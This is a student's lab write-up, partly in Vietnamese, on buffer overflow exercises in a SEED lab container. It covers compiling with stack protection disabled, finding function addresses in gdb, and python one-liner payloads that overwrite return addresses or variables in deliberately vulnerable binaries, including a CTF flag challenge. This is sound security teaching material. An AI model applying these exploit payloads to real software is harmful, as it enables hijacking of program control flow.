# MSSV:22110008   NAME: Do Duc Anh

# file bof1:
*result mong muốn: Khai thác lỗi tràn bộ đệm để gọi hàm secretFunc()
=>Missing arguments  
Enter text:Congratulation!  
Segmentation fault  

step 1: chạy môi trường để kiểm tra bảo mật
docker run -it --privileged -v C:/Users/anhdo/Seclabs:/home/seed/seclabs img4lab

step 2: đến folder seclabs, bof
seed@a798a1096d57:~$ cd seclabs     seed@a798a1096d57:~/seclabs$ cd bof

step 3: biên dịch file bof1.c và tắt bảo vệ stack
seed@68a4b6750ecf:~/seclabs/bof$ gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack

step 4: chạy trình gỡ lỗi để phân tích khai thác hành vi nguy hiểm
seed@a798a1096d57:~/seclabs/bof$ gdb -q bof1.out

step 5:hiện thị mã máy của hàm secretFunc
gdb-peda$ disas secretFunc

step 6: lưu địa chỉ của hàm secretFunc
save address secretFunc: 0x0804846b

step 7: tạo tràn bộ đệm với 204 ký tự 'a'
seed@69bdf0fe4fb1:~/seclabs/bof$ python -c "print('a'*204 +'\x6b\x84\x04\x08')" | ./bof1.out

# file bof2:
*result mong muốn: Khai thác lỗi tràn bộ đệm để ghi đè giá trị biến 'check'
=>[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ�
[check] 0xdeadbeef
Yeah! You win!

step1,2,3,4 is similar with bof1

step 5: tạo chuỗi tràn bộ đệm để ghi đè giá trị
seed@69bdf0fe4fb1:~/seclabs/bof$ python -c "print('a'*40 + '\xef\xbe\xad\xde')" | ./bof2.out

# file bof3:
*result mong muốn: Khai thác lỗi tràn bộ đệm để gọi hàm shell
=>You made it! The shell() function is executed

step 1,2,3 is similar with bof1

step 4: seed@69bdf0fe4fb1:~/seclabs/bof$ gdb -q bof3.out

step 5: gdb-peda$ disas shell

step 6: save address shell: 0x0804845b

step 7:
seed@69bdf0fe4fb1:~/seclabs/bof$ python -c "print('a'*128 + '\x5b\x84\x04\x08')" | ./bof3.out

# ctf:
*result mong muốn: Khai thác lỗi tràn bộ đệm để gọi hàm myfunc và lấy cờ
=> myfunc is reachedYou got the flag

step 1,2,3 is similar with bof1

step 4: seed@69bdf0fe4fb1:~/seclabs/bof$ gdb -q ctf.out

step 5: gdb-peda$ disas myfunc

step 6: save address myfunc: 0x0804851b ,save address myfunc: 0x080483e0

step 7: seed@69bdf0fe4fb1:~/seclabs/bof$ touch flag1.txt | ./ctf.out $(python -c "print('a'*104 + '\x1b\x85\x04\x08'+ '\xe0\x83\x04\x08' + '\x11\x12\x08\x04'+'\x62\x42\x64\x44')")

# flag:
*result mong muốn: Kiểm tra sự thay đổi của chương trình khi tràn bộ đệm
=>Modified

step 1,2,3 is similar with bof1

step 4:
seed@69bdf0fe4fb1:~/seclabs/bof$ ./flag.out $(python -c "print('a'*17)")

# pattern:
*result mong muốn: Kiểm tra mẫu đúng trong chương trình
=>Correct pattern

step 1,2,3 is similar with bof1

step 4: seed@69bdf0fe4fb1:~/seclabs/bof$ ./pattern.out $(python -c "print('a'*16 + '\x62\x42\x61\x41')")

# flow:
*result mong muốn: Khai thác lỗi tràn bộ đệm để thay đổi luồng chương trình
=>code flow has been modified  
Segmentation fault

step 1,2,3,4 is similar with bof1

step 5: gdb-peda$ disas change

step 6: save address change: 0x0804843b

step 7: seed@69bdf0fe4fb1:~/seclabs/bof$ ./flow.out $(python -c "print('a'*20 + '\x3b\x84\x04\x08')")



